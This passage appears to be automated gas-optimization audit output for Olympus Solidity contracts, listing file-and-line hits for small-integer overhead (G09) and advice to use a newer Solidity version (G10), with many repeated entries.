public constant decimals = 18;' modules/RANGE.sol, 65, b'    uint256 public constant FACTOR_SCALE = 1e4;\r' modules/RANGE.sol, 68, b'    ERC20 public immutable ohm;\r' modules/RANGE.sol, 71, b'    ERC20 public immutable reserve;\r'   ### G09: USAGE OF UINTS/INTS SMALLER THAN 32 BYTES (256 BITS) INCURS OVERHEAD #### problem When using elements that are smaller than 32 bytes, your contract’s gas usage may be higher. This is because the EVM operates on 32 bytes at a time. Therefore, if the element is smaller than that, the EVM must use more operations in order to reduce the size of the element from 32 bytes to the desired size. #### prof policies/Governance.sol, 164, b'        if (VOTES.balanceOf(msg.sender) * 10000 < VOTES.totalSupply() * SUBMISSION_REQUIREMENT)\r' policies/Governance.sol, 183, b'        if (proposalId_ == 0) {\r' policies/Governance.sol, 188, b'        if (instructions.length == 0) {\r' policies/Governance.sol, 243, b'        if (activeProposal.proposalId == 0) {\r' policies/Governance.sol, 247, b'        if (userVotesForProposal[activeProposal.proposalId][msg.sender] > 0) {\r' policies/Governance.sol, 268, b'        if (netVotes * 100 < VOTES.totalSupply() * EXECUTION_THRESHOLD) {\r' policies/Governance.sol, 298, b'        if (userVotes == 0) {\r' policies/Heart.sol, 122, b'        return uint256(PRICE.observationFrequency());\r' policies/Heart.sol, 122, b'        return uint256(PRICE.observationFrequency());\r' modules/INSTR.sol, 29, b'        return (1, 0);\r' modules/INSTR.sol, 48, b'        if (length == 0) revert INSTR_InstructionsCannotBeEmpty();\r' modules/INSTR.sol, 61, b'            } else if (instruction.action == Actions.ChangeExecutor && i != length - 1) {\r' modules/INSTR.sol, 70, b'            instructions.push(instructions_[i]);\r' modules/INSTR.sol, 70, b'            instructions.push(instructions_[i]);\r' Kernel.sol, 133, b'        if (moduleForKeycode == address(0)) revert Policy_ModuleDoesNotExist(keycode_);\r' Kernel.sol, 269, b'        if (address(getModuleForKeycode[keycode]) != address(0))\r' Kernel.sol, 274, b'        allKeycodes.push(keycode);\r' Kernel.sol, 283, b'        if (address(oldModule) == address(0) || oldModule == newModule_)\r' Kernel.sol, 299, b'        activePolicies.push(policy_);\r' Kernel.sol, 309, b'            moduleDependents[keycode].push(policy_);\r' Kernel.sol, 337, b'        activePolicies.pop();\r' Kernel.sol, 397, b'        for (uint256 i = 0; i < reqLength; ) {\r' Kernel.sol, 422, b'            dependents.pop();\r' Kernel.sol, 422, b'            dependents.pop();\r' modules/MINTR.sol, 26, b'        return (1, 0);\r' policies/Operator.sol, 72, b'    OlympusMinter internal MINTR;\r' policies/Operator.sol, 83, b'    uint8 public immutable ohmDecimals;\r' policies/Operator.sol, 86, b'    uint8 public immutable reserveDecimals;\r' policies/Operator.sol, 89, b'    uint32 public constant FACTOR_SCALE = 1e4;\r' policies/Operator.sol, 164, b'        MINTR = OlympusMinter(getModuleAddress(dependencies[3]));\r' policies/Operator.sol, 167, b'        ohm.safeApprove(address(MINTR), type(uint256).max);\r' policies/Operator.sol, 174, b'        Keycode MINTR_KEYCODE = MINTR.KEYCODE();\r' policies/Operator.sol, 202, b'        _updateCapacity(true, 0);\r' policies/Operator.sol, 203, b'        _updateCapacity(false, 0);\r' policies/Operator.sol, 210, b'            uint48(block.timestamp) >= RANGE.lastActive(true) + uint48(config_.regenWait) &&\r' policies/Operator.sol, 210, b'            uint48(block.timestamp) >= RANGE.lastActive(true) + uint48(config_.regenWait) &&\r' policies/Operator.sol, 210, b'            uint48(block.timestamp) >= RANGE.lastActive(true) + uint48(config_.regenWait) &&\r' policies/Operator.sol, 210, b'            uint48(block.timestamp) >= RANGE.lastActive(true) + uint48(config_.regenWait) &&\r' policies/Operator.sol, 210, b'            uint48(block.timestamp) >= RANGE.lastActive(true) + uint48(config_.regenWait) &&\r' policies/Operator.sol, 211, b'            _status.high.count >= config_.regenThreshold\r' policies/Operator.sol, 211, b'            _status.high.count >= config_.regenThreshold\r' policies/Operator.sol, 216, b'            uint48(block.timestamp) >= RANGE.lastActive(false) + uint48(config_.regenWait) &&\r' policies/Operator.sol, 216, b'            uint48(block.timestamp) >= RANGE.lastActive(false) + uint48(config_.regenWait) &&\r' policies/Operator.sol, 216, b'            uint48(block.timestamp) >= RANGE.lastActive(false) + uint48(config_.regenWait) &&\r' policies/Operator.sol, 216, b'            uint48(block.timestamp) >= RANGE.lastActive(false) + uint48(config_.regenWait) &&\r' policies/Operator.sol, 216, b'            uint48(block.timestamp) >= RANGE.lastActive(false) + uint48(config_.regenWait) &&\r' policies/Operator.sol, 217, b'            _status.low.count >= config_.regenThreshold\r' policies/Operator.sol, 217, b'            _status.low.count >= config_.regenThreshold\r' policies/Operator.sol, 333, b'            MINTR.mintOhm(msg.sender, amountOut);\r' policies/Operator.sol, 302, b'            MINTR.burnOhm(address(this), amountIn_);\r' policies/Operator.sol, 418, b'            uint8 oracleDecimals = PRICE.decimals();\r' policies/Operator.sol, 418, b'            uint8 oracleDecimals = PRICE.decimals();\r' policies/Operator.sol, 418, b'            uint8 oracleDecimals = PRICE.decimals();\r' policies/Operator.sol, 419, b'            uint256 invCushionPrice = 10**(oracleDecimals * 2) / range.cushion.low.price;\r' policies/Operator.sol, 419, b'            uint256 invCushionPrice = 10**(oracleDecimals * 2) / range.cushion.low.price;\r' policies/Operator.sol, 420, b'            uint256 invWallPrice = 10**(oracleDecimals * 2) / range.wall.low.price;\r' policies/Operator.sol, 420, b'            uint256 invWallPrice = 10**(oracleDecimals * 2) / range.wall.low.price;\r' policies/Operator.sol, 426, b'            int8 priceDecimals = _getPriceDecimals(invCushionPrice);\r' policies/Operator.sol, 426, b'            int8 priceDecimals = _getPriceDecimals(invCushionPrice);\r' policies/Operator.sol, 427, b'            int8 scaleAdjustment = int8(reserveDecimals) - int8(ohmDecimals) + (priceDecimals / 2);\r' policies/Operator.sol, 427, b'            int8 scaleAdjustment = int8(reserveDecimals) - int8(ohmDecimals) + (priceDecimals / 2);\r' policies/Operator.sol, 427, b'            int8 scaleAdjustment = int8(reserveDecimals) - int8(ohmDecimals) + (priceDecimals / 2);\r' policies/Operator.sol, 427, b'            int8 scaleAdjustment = int8(reserveDecimals) - int8(ohmDecimals) + (priceDecimals / 2);\r' policies/Operator.sol, 427, b'            int8 scaleAdjustment = int8(reserveDecimals) - int8(ohmDecimals) + (priceDecimals / 2);\r' policies/Operator.sol, 427, b'            int8 scaleAdjustment = int8(reserveDecimals) - int8(ohmDecimals) + (priceDecimals / 2);\r' policies/Operator.sol, 427, b'            int8 scaleAdjustment = int8(reserveDecimals) - int8(ohmDecimals) + (priceDecimals / 2);\r' policies/Operator.sol, 427, b'            int8 scaleAdjustment = int8(reserveDecimals) - int8(ohmDecimals) + (priceDecimals / 2);\r' policies/Operator.sol, 427, b'            int8 scaleAdjustment = int8(reserveDecimals) - int8(ohmDecimals) + (priceDecimals / 2);\r' policies/Operator.sol, 427, b'            int8 scaleAdjustment = int8(reserveDecimals) - int8(ohmDecimals) + (priceDecimals / 2);\r' policies/Operator.sol, 430, b'            uint256 oracleScale = 10**uint8(int8(oracleDecimals) - priceDecimals);\r' policies/Operator.sol, 430, b'            uint256 oracleScale = 10**uint8(int8(oracleDecimals) - priceDecimals);\r' policies/Operator.sol, 430, b'            uint256 oracleScale = 10**uint8(int8(oracleDecimals) - priceDecimals);\r' policies/Operator.sol, 430, b'            uint256 oracleScale = 10**uint8(int8(oracleDecimals) - priceDecimals);\r' policies/Operator.sol, 430, b'            uint256 oracleScale = 10**uint8(int8(oracleDecimals) - priceDecimals);\r' policies/Operator.sol, 430, b'            uint256 oracleScale = 10**uint8(int8(oracleDecimals) - priceDecimals);\r' policies/Operator.sol, 430, b'            uint256 oracleScale = 10**uint8(int8(oracleDecimals) - priceDecimals);\r' policies/Operator.sol, 430, b'            uint256 oracleScale = 10**uint8(int8(oracleDecimals) - priceDecimals);\r' policies/Operator.sol, 431, b'            uint256 bondScale = 10 **\r' policies/Operator.sol, 434, b'                uint8(\r\n                    36 + scaleAdjustment + int8(ohmDecimals) - int8(reserveDecimals) - priceDecimals\r\n                );\r' policies/Operator.sol, 432, b'                uint8(\r' policies/Operator.sol, 433, b'                    36 + scaleAdjustment + int8(ohmDecimals) - int8(reserveDecimals) - priceDecimals\r' policies/Operator.sol, 433, b'                    36 + scaleAdjustment + int8(ohmDecimals) - int8(reserveDecimals) - priceDecimals\r' policies/Operator.sol, 433, b'                    36 + scaleAdjustment + int8(ohmDecimals) - int8(reserveDecimals) - priceDecimals\r' policies/Operator.sol, 433, b'                    36 + scaleAdjustment + int8(ohmDecimals) - int8(reserveDecimals) - priceDecimals\r' policies/Operator.sol, 433, b'                    36 + scaleAdjustment + int8(ohmDecimals) - int8(reserveDecimals) - priceDecimals\r' policies/Operator.sol, 433, b'                    36 + scaleAdjustment + int8(ohmDecimals) - int8(reserveDecimals) - priceDecimals\r' policies/Operator.sol, 433, b'                    36 + scaleAdjustment + int8(ohmDecimals) - int8(reserveDecimals) - priceDecimals\r' policies/Operator.sol, 433, b'                    36 + scaleAdjustment + int8(ohmDecimals) - int8(reserveDecimals) - priceDecimals\r' policies/Operator.sol, 433, b'                    36 + scaleAdjustment + int8(ohmDecimals) - int8(reserveDecimals) - priceDecimals\r' policies/Operator.sol, 433, b'                    36 + scaleAdjustment + int8(ohmDecimals) - int8(reserveDecimals) - priceDecimals\r' policies/Operator.sol, 433, b'                    36 + scaleAdjustment + int8(ohmDecimals) - int8(reserveDecimals) - priceDecimals\r' policies/Operator.sol, 433, b'                    36 + scaleAdjustment + int8(ohmDecimals) - int8(reserveDecimals) - priceDecimals\r' policies/Operator.sol, 433, b'                    36 + scaleAdjustment + int8(ohmDecimals) - int8(reserveDecimals) - priceDecimals\r' policies/Operator.sol, 443, b'            uint256 marketCapacity = range.low.capacity.mulDiv(config_.cushionFactor, FACTOR_SCALE);\r' policies/Operator.sol, 443, b'            uint256 marketCapacity = range.low.capacity.mulDiv(config_.cushionFactor, FACTOR_SCALE);\r' policies/Operator.sol, 446, b'            IBondAuctioneer.MarketParams memory params = IBondAuctioneer.MarketParams({\r' policies/Operator.sol, 454, b'                debtBuffer: config_.cushionDebtBuffer,\r' policies/Operator.sol, 455, b'                vesting: uint48(0), // Instant swaps\r' policies/Operator.sol, 455, b'                vesting: uint48(0), // Instant swaps\r' policies/Operator.sol, 455, b'                vesting: uint48(0), // Instant swaps\r' policies/Operator.sol, 456, b'                conclusion: uint48(block.timestamp + config_.cushionDuration),\r' policies/Operator.sol, 456, b'                conclusion: uint48(block.timestamp + config_.cushionDuration),\r' policies/Operator.sol, 456, b'                conclusion: uint48(block.timestamp + config_.cushionDuration),\r' policies/Operator.sol, 457, b'                depositInterval: config_.cushionDepositInterval,\r' policies/Operator.sol, 458, b'                scaleAdjustment: scaleAdjustment\r' policies/Operator.sol, 371, b'            int8 priceDecimals = _getPriceDecimals(range.cushion.high.price);\r' policies/Operator.sol, 371, b'            int8 priceDecimals = _getPriceDecimals(range.cushion.high.price);\r' policies/Operator.sol, 372, b'            int8 scaleAdjustment = int8(ohmDecimals) - int8(reserveDecimals) + (priceDecimals / 2);\r' policies/Operator.sol, 372, b'            int8 scaleAdjustment = int8(ohmDecimals) - int8(reserveDecimals) + (priceDecimals / 2);\r' policies/Operator.sol, 372, b'            int8 scaleAdjustment = int8(ohmDecimals) - int8(reserveDecimals) + (priceDecimals / 2);\r' policies/Operator.sol, 372, b'            int8 scaleAdjustment = int8(ohmDecimals) - int8(reserveDecimals) + (priceDecimals / 2);\r' policies/Operator.sol, 372, b'            int8 scaleAdjustment = int8(ohmDecimals) - int8(reserveDecimals) + (priceDecimals / 2);\r' policies/Operator.sol, 372, b'            int8 scaleAdjustment = int8(ohmDecimals) - int8(reserveDecimals) + (priceDecimals / 2);\r' policies/Operator.sol, 372, b'            int8 scaleAdjustment = int8(ohmDecimals) - int8(reserveDecimals) + (priceDecimals / 2);\r' policies/Operator.sol, 372, b'            int8 scaleAdjustment = int8(ohmDecimals) - int8(reserveDecimals) + (priceDecimals / 2);\r' policies/Operator.sol, 372, b'            int8 scaleAdjustment = int8(ohmDecimals) - int8(reserveDecimals) + (priceDecimals / 2);\r' policies/Operator.sol, 372, b'            int8 scaleAdjustment = int8(ohmDecimals) - int8(reserveDecimals) + (priceDecimals / 2);\r' policies/Operator.sol, 375, b'            uint256 oracleScale = 10**uint8(int8(PRICE.decimals()) - priceDecimals);\r' policies/Operator.sol, 375, b'            uint256 oracleScale = 10**uint8(int8(PRICE.decimals()) - priceDecimals);\r' policies/Operator.sol, 375, b'            uint256 oracleScale = 10**uint8(int8(PRICE.decimals()) - priceDecimals);\r' policies/Operator.sol, 375, b'            uint256 oracleScale = 10**uint8(int8(PRICE.decimals()) - priceDecimals);\r' policies/Operator.sol, 375, b'            uint256 oracleScale = 10**uint8(int8(PRICE.decimals()) - priceDecimals);\r' policies/Operator.sol, 375, b'            uint256 oracleScale = 10**uint8(int8(PRICE.decimals()) - priceDecimals);\r' policies/Operator.sol, 375, b'            uint256 oracleScale = 10**uint8(int8(PRICE.decimals()) - priceDecimals);\r' policies/Operator.sol, 375, b'            uint256 oracleScale = 10**uint8(int8(PRICE.decimals()) - priceDecimals);\r' policies/Operator.sol, 375, b'            uint256 oracleScale = 10**uint8(int8(PRICE.decimals()) - priceDecimals);\r' policies/Operator.sol, 376, b'            uint256 bondScale = 10 **\r' policies/Operator.sol, 379, b'                uint8(\r\n                    36 + scaleAdjustment + int8(reserveDecimals) - int8(ohmDecimals) - priceDecimals\r\n                );\r' policies/Operator.sol, 377, b'                uint8(\r' policies/Operator.sol, 378, b'                    36 + scaleAdjustment + int8(reserveDecimals) - int8(ohmDecimals) - priceDecimals\r' policies/Operator.sol, 378, b'                    36 + scaleAdjustment + int8(reserveDecimals) - int8(ohmDecimals) - priceDecimals\r' policies/Operator.sol, 378, b'                    36 + scaleAdjustment + int8(reserveDecimals) - int8(ohmDecimals) - priceDecimals\r' policies/Operator.sol, 378, b'                    36 + scaleAdjustment + int8(reserveDecimals) - int8(ohmDecimals) - priceDecimals\r' policies/Operator.sol, 378, b'                    36 + scaleAdjustment + int8(reserveDecimals) - int8(ohmDecimals) - priceDecimals\r' policies/Operator.sol, 378, b'                    36 + scaleAdjustment + int8(reserveDecimals) - int8(ohmDecimals) - priceDecimals\r' policies/Operator.sol, 378, b'                    36 + scaleAdjustment + int8(reserveDecimals) - int8(ohmDecimals) - priceDecimals\r' policies/Operator.sol, 378, b'                    36 + scaleAdjustment + int8(reserveDecimals) - int8(ohmDecimals) - priceDecimals\r' policies/Operator.sol, 378, b'                    36 + scaleAdjustment + int8(reserveDecimals) - int8(ohmDecimals) - priceDecimals\r' policies/Operator.sol, 378, b'                    36 + scaleAdjustment + int8(reserveDecimals) - int8(ohmDecimals) - priceDecimals\r' policies/Operator.sol, 378, b'                    36 + scaleAdjustment + int8(reserveDecimals) - int8(ohmDecimals) - priceDecimals\r' policies/Operator.sol, 378, b'                    36 + scaleAdjustment + int8(reserveDecimals) - int8(ohmDecimals) - priceDecimals\r' policies/Operator.sol, 378, b'                    36 + scaleAdjustment + int8(reserveDecimals) - int8(ohmDecimals) - priceDecimals\r' policies/Operator.sol, 389, b'                config_.cushionFactor,\r' policies/Operator.sol, 390, b'                FACTOR_SCALE\r' policies/Operator.sol, 394, b'            IBondAuctioneer.MarketParams memory params = IBondAuctioneer.MarketParams({\r' policies/Operator.sol, 402, b'                debtBuffer: config_.cushionDebtBuffer,\r' policies/Operator.sol, 403, b'                vesting: uint48(0), // Instant swaps\r' policies/Operator.sol, 403, b'                vesting: uint48(0), // Instant swaps\r' policies/Operator.sol, 403, b'                vesting: uint48(0), // Instant swaps\r' policies/Operator.sol, 404, b'                conclusion: uint48(block.timestamp + config_.cushionDuration),\r' policies/Operator.sol, 404, b'                conclusion: uint48(block.timestamp + config_.cushionDuration),\r' policies/Operator.sol, 404, b'                conclusion: uint48(block.timestamp + config_.cushionDuration),\r' policies/Operator.sol, 405, b'                depositInterval: config_.cushionDepositInterval,\r' policies/Operator.sol, 406, b'                scaleAdjustment: scaleAdjustment\r' policies/Operator.sol, 477, b'            RANGE.updateMarket(high_, type(uint256).max, 0);\r' policies/Operator.sol, 485, b'        int8 decimals;\r' policies/Operator.sol, 486, b'        while (price_ >= 10) {\r' policies/Operator.sol, 488, b'            decimals++;\r' policies/Operator.sol, 493, b'        return decimals - int8(PRICE.decimals());\r' policies/Operator.sol, 493, b'        return decimals - int8(PRICE.decimals());\r' policies/Operator.sol, 493, b'        return decimals - int8(PRICE.decimals());\r' policies/Operator.sol, 493, b'        return decimals - int8(PRICE.decimals());\r' policies/Operator.sol, 493, b'        return decimals - int8(PRICE.decimals());\r' policies/Operator.sol, 493, b'        return decimals - int8(PRICE.decimals());\r' policies/Operator.sol, 518, b'        if (cushionFactor_ > 10000 || cushionFactor_ < 100) revert Operator_InvalidParams();\r' policies/Operator.sol, 518, b'        if (cushionFactor_ > 10000 || cushionFactor_ < 100) revert Operator_InvalidParams();\r' policies/Operator.sol, 518, b'        if (cushionFactor_ > 10000 || cushionFactor_ < 100) revert Operator_InvalidParams();\r' policies/Operator.sol, 518, b'        if (cushionFactor_ > 10000 || cushionFactor_ < 100) revert Operator_InvalidParams();\r' policies/Operator.sol, 521, b'        _config.cushionFactor = cushionFactor_;\r' policies/Operator.sol, 533, b'        if (duration_ > uint256(7 days) || duration_ < uint256(1 days))\r' policies/Operator.sol, 533, b'        if (duration_ > uint256(7 days) || duration_ < uint256(1 days))\r' policies/Operator.sol, 533, b'        if (duration_ > uint256(7 days) || duration_ < uint256(1 days))\r' policies/Operator.sol, 533, b'        if (duration_ > uint256(7 days) || duration_ < uint256(1 days))\r' policies/Operator.sol, 535, b'        if (debtBuffer_ < uint32(10_000)) revert Operator_InvalidParams();\r' policies/Operator.sol, 535, b'        if (debtBuffer_ < uint32(10_000)) revert Operator_InvalidParams();\r' policies/Operator.sol, 535, b'        if (debtBuffer_ < uint32(10_000)) revert Operator_InvalidParams();\r' policies/Operator.sol, 535, b'        if (debtBuffer_ < uint32(10_000)) revert Operator_InvalidParams();\r' policies/Operator.sol, 536, b'        if (depositInterval_ < uint32(1 hours) || depositInterval_ > duration_)\r' policies/Operator.sol, 536, b'        if (depositInterval_ < uint32(1 hours) || depositInterval_ > duration_)\r' policies/Operator.sol, 536, b'        if (depositInterval_ < uint32(1 hours) || depositInterval_ > duration_)\r' policies/Operator.sol, 536, b'        if (depositInterval_ < uint32(1 hours) || depositInterval_ > duration_)\r' policies/Operator.sol, 536, b'        if (depositInterval_ < uint32(1 hours) || depositInterval_ > duration_)\r' policies/Operator.sol, 536, b'        if (depositInterval_ < uint32(1 hours) || depositInterval_ > duration_)\r' policies/Operator.sol, 540, b'        _config.cushionDuration = duration_;\r' policies/Operator.sol, 541, b'        _config.cushionDebtBuffer = debtBuffer_;\r' policies/Operator.sol, 542, b'        _config.cushionDepositInterval = depositInterval_;\r' policies/Operator.sol, 550, b'        if (reserveFactor_ > 10000 || reserveFactor_ < 100) revert Operator_InvalidParams();\r' policies/Operator.sol, 550, b'        if (reserveFactor_ > 10000 || reserveFactor_ < 100) revert Operator_InvalidParams();\r' policies/Operator.sol, 550, b'        if (reserveFactor_ > 10000 || reserveFactor_ < 100) revert Operator_InvalidParams();\r' policies/Operator.sol, 550, b'        if (reserveFactor_ > 10000 || reserveFactor_ < 100) revert Operator_InvalidParams();\r' policies/Operator.sol, 553, b'        _config.reserveFactor = reserveFactor_;\r' policies/Operator.sol, 565, b'        if (wait_ < 1 hours || threshold_ > observe_ || observe_ == 0)\r' policies/Operator.sol, 565, b'        if (wait_ < 1 hours || threshold_ > observe_ || observe_ == 0)\r' policies/Operator.sol, 565, b'        if (wait_ < 1 hours || threshold_ > observe_ || observe_ == 0)\r' policies/Operator.sol, 565, b'        if (wait_ < 1 hours || threshold_ > observe_ || observe_ == 0)\r' policies/Operator.sol, 565, b'        if (wait_ < 1 hours || threshold_ > observe_ || observe_ == 0)\r' policies/Operator.sol, 565, b'        if (wait_ < 1 hours || threshold_ > observe_ || observe_ == 0)\r' policies/Operator.sol, 569, b'        _config.regenWait = wait_;\r' policies/Operator.sol, 570, b'        _config.regenThreshold = threshold_;\r' policies/Operator.sol, 571, b'        _config.regenObserve = observe_;\r' policies/Operator.sol, 574, b'        _status.high.count = 0;\r' policies/Operator.sol, 575, b'        _status.high.nextObservation = 0;\r' policies/Operator.sol, 578, b'        _status.low.count = 0;\r' policies/Operator.sol, 579, b'        _status.low.nextObservation = 0;\r' policies/Operator.sol, 590, b'        if (address(auctioneer_) == address(0) || address(callback_) == address(0))\r' policies/Operator.sol, 590, b'        if (address(auctioneer_) == address(0) || address(callback_) == address(0))\r' policies/Operator.sol, 665, b'        uint32 observe = _config.regenObserve;\r' policies/Operator.sol, 665, b'        uint32 observe = _config.regenObserve;\r' policies/Operator.sol, 675, b'                _status.low.count--;\r' policies/Operator.sol, 670, b'                _status.low.count++;\r' policies/Operator.sol, 678, b'        _status.low.nextObservation = (regen.nextObservation + 1) % observe;\r' policies/Operator.sol, 691, b'                _status.high.count--;\r' policies/Operator.sol, 686, b'                _status.high.count++;\r' policies/Operator.sol, 694, b'        _status.high.nextObservation = (regen.nextObservation + 1) % observe;\r' policies/Operator.sol, 717, b'            _status.low.count = uint32(0);\r' policies/Operator.sol, 719, b'            _status.low.nextObservation = uint32(0);\r' policies/Operator.sol, 720, b'            _status.low.lastRegen = uint48(block.timestamp);\r' policies/Operator.sol, 705, b'            _status.high.count = uint32(0);\r' policies/Operator.sol, 707, b'            _status.high.nextObservation = uint32(0);\r' policies/Operator.sol, 708, b'            _status.high.lastRegen = uint48(block.timestamp);\r' policies/Operator.sol, 764, b'                10**ohmDecimals * 10**PRICE.decimals(),\r' policies/Operator.sol, 764, b'                10**ohmDecimals * 10**PRICE.decimals(),\r' policies/Operator.sol, 764, b'                10**ohmDecimals * 10**PRICE.decimals(),\r' policies/Operator.sol, 764, b'                10**ohmDecimals * 10**PRICE.decimals(),\r' policies/Operator.sol, 764, b'                10**ohmDecimals * 10**PRICE.decimals(),\r' policies/Operator.sol, 765, b'                10**reserveDecimals * RANGE.price(true, true)\r' policies/Operator.sol, 765, b'                10**reserveDecimals * RANGE.price(true, true)\r' policies/Operator.sol, 753, b'                10**reserveDecimals * RANGE.price(true, false),\r' policies/Operator.sol, 753, b'                10**reserveDecimals * RANGE.price(true, false),\r' policies/Operator.sol, 754, b'                10**ohmDecimals * 10**PRICE.decimals()\r' policies/Operator.sol, 754, b'                10**ohmDecimals * 10**PRICE.decimals()\r' policies/Operator.sol, 754, b'                10**ohmDecimals * 10**PRICE.decimals()\r' policies/Operator.sol, 754, b'                10**ohmDecimals * 10**PRICE.decimals()\r' policies/Operator.sol, 754, b'                10**ohmDecimals * 10**PRICE.decimals()\r' policies/Operator.sol, 780, b'        uint256 capacity = (reservesInTreasury * _config.reserveFactor) / FACTOR_SCALE;\r' modules/PRICE.sol, 44, b'    uint32 public nextObsIndex;' modules/PRICE.sol, 47, b'    uint32 public numObservations;' modules/PRICE.sol, 50, b'    uint48 public observationFrequency;' modules/PRICE.sol, 53, b'    uint48 public movingAverageDuration;' modules/PRICE.sol, 56, b'    uint48 public lastObservationTime;' modules/PRICE.sol, 59, b'    uint8 public constant decimals = 18;' modules/PRICE.sol, 114, b'        return (1, 0);' modules/PRICE.sol, 127, b'        uint32 numObs = numObservations;' modules/PRICE.sol, 127, b'        uint32 numObs = numObservations;' modules/PRICE.sol, 143, b'        lastObservationTime = uint48(block.timestamp);' modules/PRICE.sol, 144, b'        nextObsIndex = (nextObsIndex + 1) % numObs;' modules/PRICE.sol, 165, b'            if (updatedAt < block.timestamp - 3 * uint256(observationFrequency))' modules/PRICE.sol, 165, b'            if (updatedAt < block.timestamp - 3 * uint256(observationFrequency))' modules/PRICE.sol, 171, b'            if (updatedAt < block.timestamp - uint256(observationFrequency))' modules/PRICE.sol, 185, b'        uint32 lastIndex = nextObsIndex == 0 ? numObservations - 1 : nextObsIndex - 1;' modules/PRICE.sol, 185, b'        uint32 lastIndex = nextObsIndex == 0 ? numObservations - 1 : nextObsIndex - 1;' modules/PRICE.sol, 185, b'        uint32 lastIndex = nextObsIndex == 0 ? numObservations - 1 : nextObsIndex - 1;' modules/PRICE.sol, 185, b'        uint32 lastIndex = nextObsIndex == 0 ? numObservations - 1 : nextObsIndex - 1;' modules/PRICE.sol, 215, b'        if (startObservations_.length != numObs || lastObservationTime_ > uint48(block.timestamp))' modules/PRICE.sol, 215, b'        if (startObservations_.length != numObs || lastObservationTime_ > uint48(block.timestamp))' modules/PRICE.sol, 215, b'        if (startObservations_.length != numObs || lastObservationTime_ > uint48(block.timestamp))' modules/PRICE.sol, 221, b'            if (startObservations_[i] == 0) revert Price_InvalidParams();' modules/PRICE.sol, 231, b'        lastObservationTime = lastObservationTime_;' modules/PRICE.sol, 242, b'        if (movingAverageDuration_ == 0 || movingAverageDuration_ % observationFrequency != 0)' modules/PRICE.sol, 242, b'        if (movingAverageDuration_ == 0 || movingAverageDuration_ % observationFrequency != 0)' modules/PRICE.sol, 242, b'        if (movingAverageDuration_ == 0 || movingAverageDuration_ % observationFrequency != 0)' modules/PRICE.sol, 242, b'        if (movingAverageDuration_ == 0 || movingAverageDuration_ % observationFrequency != 0)' modules/PRICE.sol, 242, b'        if (movingAverageDuration_ == 0 || movingAverageDuration_ % observationFrequency != 0)' modules/PRICE.sol, 242, b'        if (movingAverageDuration_ == 0 || movingAverageDuration_ % observationFrequency != 0)' modules/PRICE.sol, 246, b'        uint256 newObservations = uint256(movingAverageDuration_ / observationFrequency);' modules/PRICE.sol, 246, b'        uint256 newObservations = uint256(movingAverageDuration_ / observationFrequency);' modules/PRICE.sol, 246, b'        uint256 newObservations = uint256(movingAverageDuration_ / observationFrequency);' modules/PRICE.sol, 253, b'        lastObservationTime = 0;' modules/PRICE.sol, 255, b'        nextObsIndex = 0;' modules/PRICE.sol, 256, b'        movingAverageDuration = movingAverageDuration_;' modules/PRICE.sol, 257, b'        numObservations = uint32(newObservations);' modules/PRICE.sol, 268, b'        if (observationFrequency_ == 0 || movingAverageDuration % observationFrequency_ != 0)' modules/PRICE.sol, 268, b'        if (observationFrequency_ == 0 || movingAverageDuration % observationFrequency_ != 0)' modules/PRICE.sol, 268, b'        if (observationFrequency_ == 0 || movingAverageDuration % observationFrequency_ != 0)' modules/PRICE.sol, 268, b'        if (observationFrequency_ == 0 || movingAverageDuration % observationFrequency_ != 0)' modules/PRICE.sol, 268, b'        if (observationFrequency_ == 0 || movingAverageDuration % observationFrequency_ != 0)' modules/PRICE.sol, 268, b'        if (observationFrequency_ == 0 || movingAverageDuration % observationFrequency_ != 0)' modules/PRICE.sol, 272, b'        uint256 newObservations = uint256(movingAverageDuration / observationFrequency_);' modules/PRICE.sol, 272, b'        uint256 newObservations = uint256(movingAverageDuration / observationFrequency_);' modules/PRICE.sol, 272, b'        uint256 newObservations = uint256(movingAverageDuration / observationFrequency_);' modules/PRICE.sol, 285, b'        lastObservationTime = 0;' modules/PRICE.sol, 287, b'        nextObsIndex = 0;' modules/PRICE.sol, 288, b'        observationFrequency = observationFrequency_;' modules/PRICE.sol, 289, b'        numObservations = uint32(newObservations);' policies/PriceConfig.sol, 49, b'        PRICE.initialize(startObservations_, lastObservationTime_);\r' policies/PriceConfig.sol, 62, b'        PRICE.changeMovingAverageDuration(movingAverageDuration_);\r' policies/PriceConfig.sol, 62, b'        PRICE.changeMovingAverageDuration(movingAverageDuration_);\r' policies/PriceConfig.sol, 73, b'        PRICE.changeObservationFrequency(observationFrequency_);\r' policies/PriceConfig.sol, 73, b'        PRICE.changeObservationFrequency(observationFrequency_);\r' modules/RANGE.sol, 116, b'        return (1, 0);\r' modules/RANGE.sol, 148, b'                _range.low.lastActive = uint48(block.timestamp);\r' modules/RANGE.sol, 136, b'                _range.high.lastActive = uint48(block.timestamp);\r' modules/RANGE.sol, 221, b'        if (market_ == type(uint256).max && marketCapacity_ != 0) revert RANGE_InvalidParams();\r' modules/RANGE.sol, 245, b'            wallSpread_ > 10000 ||\r' modules/RANGE.sol, 246, b'            wallSpread_ < 100 ||\r' modules/RANGE.sol, 247, b'            cushionSpread_ > 10000 ||\r' modules/RANGE.sol, 248, b'            cushionSpread_ < 100 ||\r' modules/RANGE.sol, 264, b'        if (thresholdFactor_ > 10000 || thresholdFactor_ < 100) revert RANGE_InvalidParams();\r' modules/RANGE.sol, 264, b'        if (thresholdFactor_ > 10000 || thresholdFactor_ < 100) revert RANGE_InvalidParams();\r' modules/RANGE.sol, 344, b'            return _range.low.lastActive;\r' modules/RANGE.sol, 342, b'            return _range.high.lastActive;\r' policies/TreasuryCustodian.sol, 60, b'            TRSRY.setApprovalFor(policy_, tokens_[j], 0);\r' modules/TRSRY.sol, 52, b'        return (1, 0);\r' modules/TRSRY.sol, 106, b'        if (reserveDebt[token_][msg.sender] == 0) revert TRSRY_NoDebtOutstanding();\r' modules/VOTES.sol, 28, b'        return (1, 0);\r'  ### G10:USE A MORE RECENT VERSION OF SOLIDITY Use a solidity version of at least 0.8.2 to get simple compiler automatic inlining Use a solidity version of at least 0.8.3 to get better struct packing and cheaper multiple storage reads Use a solidity version of at least 0.8.4 to get custom errors, which are cheaper at deployment than revert()/require() strings Use a solidity version of at least 0.8.10 to have external calls skip contract existence checks if the external call has a return value 
